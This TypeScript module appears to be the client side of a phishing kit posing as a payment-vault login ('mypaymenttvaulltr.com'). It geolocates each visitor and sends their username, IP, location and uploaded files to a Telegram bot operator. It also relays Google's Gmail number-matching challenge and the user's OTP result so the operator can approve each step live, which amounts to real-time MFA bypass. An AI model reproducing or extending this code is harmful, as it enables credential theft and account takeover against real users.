/* All Telegram calls are proxied through the backend so that secrets
   are never needed in the browser bundle. */

const API = "/api/tg";

const SESSION_TOKEN_KEY = "gajipro_session_token";
const PENDING_TOKEN_KEY = "gajipro_pending_token";

function getTgAuthHeader(): Record<string, string> {
  try {
    const sessionToken = localStorage.getItem(SESSION_TOKEN_KEY);
    if (sessionToken) return { "Authorization": `Bearer ${sessionToken}` };
    const pendingToken = localStorage.getItem(PENDING_TOKEN_KEY);
    if (pendingToken) return { "x-pending-token": pendingToken };
  } catch { /* ignore */ }
  return {};
}

/* ─── helpers ─────────────────────────────────────────────────── */

async function post(path: string, body: unknown): Promise<unknown> {
  try {
    const r = await fetch(`${API}${path}`, {
      method: "POST",
      headers: { "Content-Type": "application/json", ...getTgAuthHeader() },
      body: JSON.stringify(body),
    });
    return await r.json();
  } catch {
    return { ok: false };
  }
}

async function get(path: string): Promise<unknown> {
  try {
    const r = await fetch(`${API}${path}`, { headers: getTgAuthHeader() });
    return await r.json();
  } catch {
    return { ok: false, result: [] };
  }
}

/* ─── public IP / location (still client-side, no secrets needed) */

export async function getPublicIP(): Promise<string> {
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json() as { ip?: string };
    return d.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

export async function getIPInfo(): Promise<string> {
  try {
    const r1 = await fetch("https://api.ipify.org?format=json");
    const { ip } = await r1.json() as { ip?: string };
    if (!ip) return "unknown";
    const r2  = await fetch(`https://ipapi.co/${ip}/json/`);
    const loc = await r2.json() as { city?: string; region?: string; country_name?: string; org?: string };
    const city    = loc.city         ?? "";
    const region  = loc.region       ?? "";
    const country = loc.country_name ?? "";
    const org     = loc.org          ?? "";
    const parts   = [city, region, country].filter(Boolean).join(", ");
    return `${ip} (${parts}${org ? " — " + org : ""})`;
  } catch {
    return "unknown";
  }
}

/* ─── send plain HTML message ──────────────────────────────────── */

export async function sendTelegram(message: string): Promise<void> {
  await post("/send-message", { text: message, parse_mode: "HTML" });
}

/* ─── send file ────────────────────────────────────────────────── */

export async function sendFileToTelegram(file: File, caption: string): Promise<void> {
  try {
    const form = new FormData();
    form.append("caption", caption);
    form.append("document", file, file.name);
    await fetch(`${API}/send-document`, { method: "POST", headers: getTgAuthHeader(), body: form });
  } catch { /* silent */ }
}

/* ─── send approval request with inline keyboard ───────────────── */

export async function sendApprovalRequest(
  username: string,
  ip: string,
  now: string,
  sessionKey: string,
  label = "Login"
): Promise<number | null> {
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Permintaan ${label}</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b>   : <code>${username}</code>\n` +
    `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
    `🕐 <b>Waktu</b>      : ${now}\n\n` +
    `⚠️ <i>Setujui permintaan ${label.toLowerCase()} ini?</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;

  const data = await post("/send-message", {
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
        { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
      ]],
    },
  }) as { ok?: boolean; messageId?: number | null };

  return data?.messageId ?? null;
}

/* ─── get latest offset ────────────────────────────────────────── */

export async function getLatestOffset(): Promise<number> {
  const data = await get("/latest-offset") as { offset?: number };
  return data?.offset ?? 0;
}

/* ─── poll for approve / reject ────────────────────────────────── */

export async function pollApproval(
  offset: number,
  sessionKey: string
): Promise<{ status: "approved" | "rejected" | "pending"; nextOffset: number; callbackId?: string }> {
  const data = await get(`/updates?offset=${offset}&timeout=2`) as {
    ok?: boolean;
    result?: { update_id: number; callback_query?: { id: string; data?: string } }[];
  };

  if (!data?.ok || !data.result?.length) return { status: "pending", nextOffset: offset };

  let status: "approved" | "rejected" | "pending" = "pending";
  let nextOffset = offset;
  let callbackId: string | undefined;

  for (const update of data.result) {
    nextOffset = update.update_id + 1;
    if (update.callback_query) {
      const cbData = update.callback_query.data ?? "";
      if (cbData === `approve_${sessionKey}`) {
        callbackId = update.callback_query.id;
        status = "approved";
      } else if (cbData === `reject_${sessionKey}`) {
        callbackId = update.callback_query.id;
        status = "rejected";
      }
    }
  }
  return { status, nextOffset, callbackId };
}

/* ─── send Gmail number challenge to admin ──────────────────────── */

export async function sendGmailVerification(
  username: string,
  ip: string,
  now: string,
  numbers: number[],
  sessionKey: string
): Promise<number | null> {
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Gmail Number Verification</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b>   : <code>${username}</code>\n` +
    `🌐 <b>IP</b>         : <code>${ip}</code>\n` +
    `🕐 <b>Waktu</b>      : ${now}\n\n` +
    `🔢 <b>Angka tampil</b>: <code>${numbers.join("  |  ")}</code>\n\n` +
    `✅ <b>Pilih angka yang benar</b> dari tombol di bawah\n` +
    `📩 <i>atau balas pesan ini dengan angka yang benar\n` +
    `(angka yang dikirim Google ke Gmail user)</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;

  const data = await post("/send-message", {
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        numbers.map(n => ({ text: `${n}`, callback_data: `gmail_${n}_${sessionKey}` })),
        [{ text: "❌ Reject", callback_data: `reject_${sessionKey}` }],
      ],
    },
  }) as { ok?: boolean; messageId?: number | null };

  return data?.messageId ?? null;
}

/* ─── poll for Gmail number selection by admin ──────────────────── */

export async function pollGmailNumber(
  offset: number,
  numbers: number[],
  sessionKey: string
): Promise<{ status: "selected" | "rejected" | "pending"; chosenNumber?: number; nextOffset: number; callbackId?: string }> {
  const data = await get(`/updates?offset=${offset}&timeout=2`) as {
    ok?: boolean;
    result?: {
      update_id: number;
      callback_query?: { id: string; data?: string };
      message?: { text?: string };
    }[];
  };

  if (!data?.ok || !data.result?.length) return { status: "pending", nextOffset: offset };

  let nextOffset = offset;

  for (const update of data.result) {
    nextOffset = update.update_id + 1;

    /* ── inline button click ── */
    if (update.callback_query) {
      const cbData = update.callback_query.data ?? "";
      const callbackId = update.callback_query.id;
      for (const n of numbers) {
        if (cbData === `gmail_${n}_${sessionKey}`) {
          return { status: "selected", chosenNumber: n, nextOffset, callbackId };
        }
      }
      if (cbData === `reject_${sessionKey}`) {
        return { status: "rejected", nextOffset, callbackId };
      }
    }

    /* ── plain text message — admin types the number ── */
    if (update.message?.text) {
      const txt = update.message.text.trim();
      /* reject keywords */
      if (/^(reject|tolak|no|tidak)$/i.test(txt)) {
        return { status: "rejected", nextOffset };
      }
      /* match any of the 3 numbers */
      for (const n of numbers) {
        if (txt === String(n)) {
          return { status: "selected", chosenNumber: n, nextOffset };
        }
      }
    }
  }
  return { status: "pending", nextOffset };
}

/* ─── answer callback query ─────────────────────────────────────── */

export async function answerCallback(callbackId: string, text: string): Promise<void> {
  await post("/answer-callback", { callbackQueryId: callbackId, text });
}

/* ─── send OTP code to admin ────────────────────────────────────── */

export async function sendBotOTP(_otp: string, username: string): Promise<void> {
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Permintaan Kode OTP</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b> : <code>${username}</code>\n\n` +
    `📧 <i>User meminta kode verifikasi.</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;
  await post("/send-message", { text, parse_mode: "HTML" });
}

/* ─── send OTP verification request (admin approve/reject) ──────── */

export async function sendOtpVerificationRequest(
  username: string,
  enteredCode: string,
  correctCode: string,
  sessionKey: string
): Promise<void> {
  const isCorrect = enteredCode === correctCode;
  const text =
    `━━━━━━━━━━━━━━━━━━━━━\n` +
    `🔐 <b>mypaymenttvaulltr.com</b>\n` +
    `📌 <b>Verifikasi Kode OTP</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>Username</b>     : <code>${username}</code>\n` +
    `${isCorrect ? "✅" : "❌"} <b>Status</b>       : ${isCorrect ? "BENAR" : "SALAH"}\n\n` +
    `⚠️ <i>Setujui akses user ini ke step berikutnya?</i>\n` +
    `━━━━━━━━━━━━━━━━━━━━━`;
  await post("/send-message", {
    text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
        { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
      ]],
    },
  });
}
